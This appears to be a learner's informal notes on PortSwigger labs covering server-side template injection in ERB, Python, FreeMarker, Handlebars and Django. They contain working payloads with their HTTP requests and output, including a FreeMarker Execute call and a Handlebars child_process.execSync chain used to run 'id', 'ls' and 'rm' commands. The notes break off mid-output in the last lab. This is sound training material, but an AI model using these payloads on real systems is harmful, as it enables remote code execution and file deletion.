# Server-side template injection
https://portswigger.net/web-security/server-side-template-injection

# Exploiting server-side template injection vulnerabilities
https://portswigger.net/web-security/server-side-template-injection/exploiting


# 1. Lab: Basic server-side template injection
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory

explore site. note that 
    GET /product?productId=1 HTTP/1.1
yeilds "out of stock messege" when Following redirection:
    GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
replace original messege with ERB executable math calculation:
    GET /?message=<%=+7+*+7+%25> HTTP/1.1
observe resault includes "49"

injection point is parameter "message"

payloads:
GET /?message=<%=+self+%25> HTTP/1.1
    main

GET /?message=<%=+self.class.name+%25> HTTP/1.1
    Object

GET /?message=<%25%3d+self.methods+%25> HTTP/1.1
    [:inspect, :to_s, :dup, :itself, :yield_self, :then, :taint, :tainted?, :untaint, :untrust, :untrusted?, :trust, :frozen?, :methods, :singleton_methods, :protected_methods, :private_methods, :public_methods, :instance_variables, :instance_variable_get, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :class, :singleton_class, :display, :clone, :hash, :public_send, :method, :public_method, :singleton_method, :define_singleton_method, :extend, :to_enum, :enum_for, :<=>, :===, :=~, :!~, :nil?, :eql?, :respond_to?, :freeze, :object_id, :send, :__send__, :!, :==, :!=, :equal?, :__id__, :instance_eval, :instance_exec]

<!-- GET /?message=<%25%3d+self.method(%3ahandle_POST).parameters+%25> HTTP/1.1 -->

GET /?message=<%25%3d+self.method(:instance_exec).parameters+%25> HTTP/1.1
    [[:rest]]

GET /?message=<%25%3d+self.yield_self+%25> HTTP/1.1
    #

after we had fun exploring lets use file.delete command to solve the lab:

GET /?message=<%25%3dFile.delete('/home/carlos/morale.txt')%25> HTTP/1.1


# 2. Lab: Basic server-side template injection (code context)
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

exploer different input points - 
1 .comment filed dosent produce errror with payload: "${{<%[%'"}}%\"
2 .email field is protected with email format validation
3 .preffered name seems to use a call to "user" object att. - "name":

leave a comment at one of the blog comment section - this installs a reflection of the preffered-name parameter:

    Wiener Peter | 25 July 2022

    blah


and send a prffered-name change with {{7*7}}:
    POST /my-account/change-blog-post-author-display HTTP/1.1
    ..
    blog-post-author-display={{7*7}}&csrf=KLKWNX8M7fYpw8oF7T1Z9ERefUjwnboy

check our comment to see if reflection has change an to what:
    {{49}} | 25 July 2022

    comment

we got a math render on the server! possible RCE vector

lets insert some python inside. remmember to leave original value "user.name" snd close with }} in order to avoid empty value error




final payload:
user.name}}{%+import+os;+%}{{os.remove("/home/carlos/morale.txt");}}



# 3. Lab: Server-side template injection using documentation
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation


to solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 


hint:
    <%<%= Dir.entries('/') %>
    = File.open('/example/arbitrary-file').read %>

login with credentials and edit a template of a post:

    try: ${7*7}
    get: 49

    try: a{*comment*}b
    get: a{*comment*}b

    try: ${"z".join("ab")}
    get: [blank]

definitly not Mako or smarty


    try: ${system(echo hello)}
    get:FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> system [in template "freemarker" 

now we know its FreeMarker!

check doumentation:
https://freemarker.apache.org/docs/index.html

from:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker---code-execution

    <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
    [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
    ${"freemarker.template.utility.Execute"?new()("id")}


try: <#assign ex = "freemarker.template.utility.Execute"?new()>${ex('id')}
get: uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) 

finale payload:
    <#assign ex = "freemarker.template.utility.Execute"?new()>${ex('rm /home/carlos/morale.txt')}

# success!


# 3. Lab: Server-side template injection in an unknown language with a documented exploit
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory


explore site observe product 1 is out of stock and triggers a GET response:
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock 

this is injection point:

try: {{7*7}} 
get: /usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
            throw new Error(str);
            Error: Parse error on line 1:
    {{7*7}}
    --^
    Expecting &apos;ID&apos;, &apos;STRING&apos;, &apos;NUMBER&apos;, &apos;BOOLEAN&apos;, &apos;UNDEFINED&apos;, &apos;NULL&apos;, &apos;DATA&apos;, got &apos;INVALID&apos;

searching for:
'CLOSE_RAW_BLOCK', 'CLOSE', 'CLOSE_UNESCAPED', 'OPEN_SEXPR', 'CLOSE_SEXPR', 'ID', 'OPEN_BLOCK_PARAMS', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NU

 search yields:
 Handlebars crash when use helpers inside tag #1157 

from:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars

    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}

    get:
    GET /?message={{%23with+"s"+as+|string|}}++{{%23with+"e"}}++++{{%23with+split+as+|conslist|}}++++++{{this.pop}}++++++{{this.push+(lookup+string.sub+"constructor")}}++++++{{this.pop}}++++++{{%23with+string.split+as+|codelist|}}++++++++{{this.pop}}++++++++{{this.push+"return+require('child_process').execSync('ls+-la')%3b"}}++++++++{{this.pop}}++++++++{{%23each+conslist}}++++++++++{{%23with+(string.sub.apply+0+codelist)}}++++++++++++{{this}}++++++++++{{/with}}++++++++{{/each}}++++++{{/with}}++++{{/with}}++{{/with}}{{/with}} HTTP/1.1

    response:
                e      2      [object Object]              function Function() { [native code] }        2        [object Object]                              total 24
    drwxr-xr-x 1 carlos carlos   45 Jul 25 21:28 .
    drwxr-xr-x 1 root   root     20 Jul 20 04:18 ..
    -rw-rw-r-- 1 carlos carlos  132 Jul 25 21:28 .bash_history
    -rw-r--r-- 1 carlos carlos  220 Feb 25  2020 .bash_logout
    -rw-r--r-- 1 carlos carlos 3771 Feb 25  2020 .bashrc
    -rw-r--r-- 1 carlos carlos  807 Feb 25  2020 .profile
    -rw-rw-r-- 1 carlos carlos 6816 Jul 25 21:28 morale.txt

so this is handler for sure!

lets tweak the code to delete carlos:


    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}

    GET {{%23with+"s"+as+|string|}}++{{%23with+"e"}}++++{{%23with+split+as+|conslist|}}++++++{{this.pop}}++++++{{this.push+(lookup+string.sub+"constructor")}}++++++{{this.pop}}++++++{{%23with+string.split+as+|codelist|}}++++++++{{this.pop}}++++++++{{this.push+"return+require('child_process').execSync('rm+/home/carlos/morale.txt')%3b"}}++++++++{{this.pop}}++++++++{{%23each+conslist}}++++++++++{{%23with+(string.sub.apply+0+codelist)}}++++++++++++{{this}}++++++++++{{/with}}++++++++{{/each}}++++++{{/with}}++++{{/with}}++{{/with}}{{/with}} HTTP/1.1

# success!




# 4. Lab: Server-side template injection with information disclosure via user-supplied objects

hint:
    ${T(java.lang.System).getenv()}

 To solve the lab, steal and submit the framework's secret key. 

 TRY: {{7*7}}
 GET:  django.template error

 https://docs.djangoproject.com/en/4.0/topics/templates/

 
 from:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file


try: {%import.os%}
get: TemplateSyntaxError: Invalid block tag on line 1: 'import.os'. Did you forget to register or load this tag?


search Error:
in parse raise self.error(token, e) AttributeError: 'NoneType' object has no attribute 'lstrip'
https://www.pythonpool.com/attributeerror-nonetype-object-has-no-attribute-group-solved/

try: {%25+debug+%25}
get:
{'


